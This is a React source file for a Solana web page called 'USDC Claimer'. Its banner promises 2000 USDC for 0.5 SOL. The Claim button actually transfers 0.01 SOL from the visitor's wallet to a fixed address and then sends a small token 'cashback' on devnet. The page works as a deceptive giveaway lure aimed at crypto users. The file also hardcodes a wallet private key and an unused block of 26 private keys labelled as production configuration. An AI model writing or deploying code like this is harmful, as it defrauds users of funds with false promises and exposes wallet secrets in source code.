/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2VtGXBwTbZH9cbM9wsPTVJYgGVGr64BmJxNb5zNA2yc4pNt7RCpjAbAvSm2RXKCUKuyJvDBwzzwU4xKDKM1x2xnD"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3cnFGLanmoskhVqAL6kdGkDNUMXppmBQV1swjHpr7t4gjpdz8Eg4QUCemJECCTNiAYvoPTMwR3R1nRApFnJpL31q",
  "key1": "2P5S7vtBJPJ2BJBhPWAXKaxLNWcNP1rFqDPzEwoEtoShx6FaakheE1zacDCPVWMtRmLmoRR69vGKgdiFMm82Jxze",
  "key2": "36vEvPwmNV36vUoPCvCTFGTkrvangHXnBWpp79xz4mG3LeTMhR3yRhubP8dywaAxWLvvARWsConMLf8JDnHd9DFm",
  "key3": "3tJE21KZH1pSPp793Sfr8fcCAsEDACitmHMjA8Lx2n4EPzd4iAQCnRpAvFMPJrp7h1W16bAEntVhoSrseA4zhNtF",
  "key4": "nUAiS19z3Nf9LN7fE2KkdD91vX3kAqNNC9idB3VidpLTbYHkYwnLQYGyYGjGbgdrJHkHi4ekt3CMR7KFY9UwDbL",
  "key5": "3Evb527L9F6pbNeQ9Hqakq5YXfY7ZDxqJTevngpx7j4zHuTeszZPiPWQrE3B88RKxTrftS9QV1sdQqHRxoKezynR",
  "key6": "245Yj27y8DkwZ32WoF6JecS5Acp78gyDh6U7tTgy9VHyQPPacN3SweXtpEyoxSFgbHxpEPA6tZS1dkPQJFExQuJh",
  "key7": "4e2vHGq5T5czYKKyAPACnYoo2Byznz2ZnwSK1oT7RYbYEegmz3AsN9QBew7scG2yfbgyg8ergqbsEh3HBg5F23mj",
  "key8": "3WQcVrt378aEoDCZrqm6EjgYR2i9oGHm5PtAj41oMpDgLkR38JrdXDNNWzp4Cy5fdZHpuKYED1puvQcvseJKx9Pu",
  "key9": "NynJCWoMQSA51wpxdHfBQJo9fPsF45v3CP7aHy4YYczGSvxpZ2fwS6Dn43JJCWMBkvRymCVsDDcc6mKGUvegH5m",
  "key10": "4UUxKGfpJohwMXrLCDvdAukJixvspHGQniKcjZx4GRS3JmdoFYVDdLm6NDpg3V95zxh17erihvnhnQdZfcNHDcG6",
  "key11": "4WayaX8oT76b7WkNbwGa9tK9mG6y2FuSaXFwx9hM128mcKiM7uZi8AAzYDFKAAzkX53Gv1kB8T1U7VMLvksuvJVh",
  "key12": "2yGoBqzJspqhVxdTXsc8xp3rYEA3Yj2zfEw3wdyqX86DAUxHjVfB2m7zRzkq9GoiMLUzJvfCQ4Rg7hQT2bzwR8AY",
  "key13": "47WeFKo91Q2MKRmoqTnSoVypUBBy2XPHR8ZVexS2Ri7xvQghGtMWBoF7vK4YPBdTowVwLZjq7UfecGSsP9DJc9Cf",
  "key14": "5Sq7QGJErce7KegYDdGxFwJZkyQbAtDiG7igC3Ex1vq7zUwZrmemoQYdWnPmo2fhMoHLAKhNtqQYEQteqVaFURZS",
  "key15": "59furUSMiSow9RfsvbdvmV2BrhmEadKNCeNydt97uLF2dtkZgKf4mNGjqvHhBpGzG1nnW47ryXxnEuatbPmULqC9",
  "key16": "5ftR7A3i8dHCupg1xQqLrEDE2iNF8pFyN3enD5EZ9Khei6SF1RDLb3A2Wm4u7tpf5QfWJsjCw2vaMYmXgQdPpTXR",
  "key17": "25hUxrQWvKitzujNFVtxtMCBYMT6yd7idU6HAJQJtKTQEDwUegmqSZ9D7hGrkKvtZVoeQFRrKzRtrD5PgpbEyY7h",
  "key18": "5XjTvA7aaJFrZyijMQZ81Nd5MzJk14ya3rCzi6mqg13E7fmtEr6rTFQG57YLTCEPJJu42k7zYDVsKNGZ8gkByQyV",
  "key19": "3b6KYQzCP2kxUWZj8gMufrDx8KMR8BQ4QRGg29usuRHybshtzDFYXo7jLyRKvLVGsh5wT926tQ4YryzduLT2sKLs",
  "key20": "3vi6hi8SnfA4WU34disfx1WgtqK9sHPjiRX8e4EhPbSQN16DFUQExgpx8EYJJW1U5yEYNPtbZdWJjPqf3ckJmumK",
  "key21": "4UDNssf4GYF55gV5TJ71RMSyBWhMUjV8HkYthn2W8RHWwUXHYv33ghmobjSvPczydjYNhu6ueqebd45nSZN5AAvB",
  "key22": "X6QGzfYgiFUE7S67PjGJTzsqr7v47EgJhiwKcDZHocpBzSf8D3Tcon391nGsssNFGUx4ZyfhGox79QNjJF9jm5M",
  "key23": "3KEDr4rT9XYcawuoP9J75yfTJASdsiNLA593RbbbSAwyAkkyjHxzU8gBAuNaeCzUuJKewUjhkToLug2iQxwjckDs",
  "key24": "5Wwf1UW9qsc5bMv9P8PvHb4PxbQkj26K99c8p3SkFgz6bc2GLkpXhFyxVkxqdF5ftF5b4hixMU6pzKS3iqZogicj",
  "key25": "pRjCVQ4eqDJvU2WU7d6P6Lm6T8pwtexQMdyvHbGxiwJHXz7UBZ3pts8KNHUZ7kGeJ2VHx3a6A684u9RtNYEm6EG"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
